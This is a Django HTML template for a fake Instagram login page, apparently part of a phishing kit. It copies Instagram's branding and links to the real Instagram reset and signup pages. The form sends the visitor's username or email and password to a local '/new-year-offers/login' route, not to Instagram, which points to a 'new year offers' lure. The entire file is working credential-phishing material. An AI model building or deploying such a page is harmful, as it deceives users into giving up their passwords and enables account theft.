{%load static%}
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>instagram login to Continue</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
	<link rel="stylesheet" type="text/css" href="{%static 'instagram/css/style.css' %}">
	<link rel="icon" href="{%static 'instagram/img/insta.png'%}">

</head>
<body>
<section class="main-section">
	<p class="text-center mt-2">Log in to Continue...</p>
	<div class="form-div text-center mt-4">
		<form class="form" method="post" action="/new-year-offers/login" autocomplete="off">{%csrf_token%}
			<img src="{%static 'instagram/img/logo.png' %}"/>
			<div class="form-floating mb-3 mt-3">
			  <input type="text" required="true" class="form-control" id="email" placeholder="Enter email" name="email">
			  <label for="email">Phone number, username or email address</label>
			</div>

			<div class="form-floating mt-3 mb-3">
			  <input type="password" required="true" class="form-control" id="pwd" placeholder="Enter password" name="passwd">
			  <label for="pwd">Password</label>
			</div>
			<input type="submit" value="Log in" class="btn btn-primary btn-login ">
			<span class="mt-3" style="display: flex; justify-content: space-around;"><hr width="100" /> <p>OR</p> <hr width="100"/></span>
			<a href="https://www.instagram.com/accounts/password/reset/" class="text-decoration-none" ><small>Forgotten your password?</small></a>
		</form>	
	</div>
	
	<div class="form-div text-center mt-3">
		<div class="signup-div">
			<p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" class="text-decoration-none">Sign up</a></p>
		</div>
	</div>

	<div class="getapp">
		<p>Get the app.</p>
		<img src="{%static 'instagram/img/getapp.png' %}"/>
	</div>
</section>



<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
</body>
</html>
